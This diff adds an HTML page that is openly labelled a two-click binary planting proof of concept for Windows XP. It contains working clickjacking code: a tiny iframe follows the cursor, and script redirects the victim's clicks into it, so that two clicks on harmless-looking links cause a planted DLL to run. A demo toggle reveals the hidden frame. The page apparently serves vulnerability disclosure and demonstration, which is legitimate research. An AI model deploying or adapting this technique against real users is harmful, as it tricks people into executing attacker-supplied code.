@@ -1,0 +1,89 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML>
+	<HEAD>
+		<META HTTP-EQUIV="CACHE-CONTROL" CONTENT="NO-CACHE">
+		<META HTTP-EQUIV="PRAGMA" CONTENT="NO-CACHE">
+		<style type="text/css">
+			html, body { overflow:hidden }
+		</style>
+		<script type="text/javascript">
+			var d=document;
+			var lastHovered=null;
+			function evtCatcher(evt)
+			{
+				try{
+					var e = e || window.event;
+					if (evt==0)
+						lastHovered=e.srcElement;
+					else if (evt<3)
+						lastHovered.click();
+				}
+				catch(e){};
+			}
+		</script>
+		<TITLE>XP 2-click Binary Planting PoC</TITLE>
+	</HEAD>
+	<BODY onload="wait.style.display='none';content.style.display='block';" onmousemove="evtCatcher(0);tgt.frameElement.style.left=event.clientX-1;tgt.frameElement.style.top=event.clientY-1;">
+	<!--payload iframe-->		
+	<iframe name="tgt" onblur="evtCatcher(1)" onfocus="evtCatcher(2)" onmouseout="evtCatcher(4);this.style.left=event.clientX;this.style.top=event.clientY;" 
+	style="position: absolute; top: 100px; left: 100px; width: 2px; height: 2px; z-index: 1; border: 0;" 
+	src="inner.html" frameborder=0 scrolling=no>
+	</iframe>
+	<div id="wait" style="display:block">
+		<CENTER>
+			<TABLE border=0 cellSpacing=15 cellPadding=0>
+					<TR vAlign=top>
+						<TD width=400>
+							<strong>
+								Please wait...
+							</strong>
+						</TD>
+					</TR>
+			</TABLE>
+    </CENTER>
+	</div>
+	<div id="content" style="display:none">
+		<CENTER>
+			<TABLE border=0 cellSpacing=15 cellPadding=0>
+			  	<TR vAlign=top>
+			  		<TD width=400>
+			  			<strong>
+			  			1. To test and execute the PoC first click <A href="javascript:" onclick="more.style.display='block'">here</A>
+			  			</strong>
+			  			<br>
+			  			<div id="more" style="display:none">
+			  				<br>
+			  				<strong>
+			  					2. Now click <a href="javascript:" onclick="evenmore.style.display='block'">here</a>
+			  					 and the planted DLL will show a "HACKED!" dialog (watch the task bar in case it pops up in the background)
+			  				</strong>
+			  			</div>
+			  			<div id="evenmore" style="display:none">
+			  					<i>this might take a moment...</i>
+			  			</div>
+			  		</TD>
+			  	</TR>
+			</TABLE>
+    </CENTER>
+    <!--test section-->
+    <table width="100%">
+    	<tr>
+    		<td>
+    			<div id="toolbar1" style="display:none;color:gray">
+    				<a name="toolbar1a" onmouseover="this.click()" 
+    					onclick="d.body.style.background='white';toolbar2.style.display='block';toolbar1.style.display='none';tgt.frameElement.style.width='2px';tgt.frameElement.style.height='2px';">
+    					<i>mouse over to hide the backstage</i>
+    				</a>
+    			</div>
+    		</td>
+    		<td width="25%">
+    			<a style="display:block;color:black" id="toolbar2" name="toolbar2a" onmouseover="this.click()" 
+    				onclick="d.body.style.background='green';toolbar1.style.display='block';toolbar2.style.display='none';tgt.frameElement.style.width='400px';tgt.frameElement.style.height='400px';">
+    				<i>mouse over to show the backstage</i>
+    			</a>
+    		</td>
+    	</tr>
+    </table>
+  </div>
+  </BODY>
+</HTML>
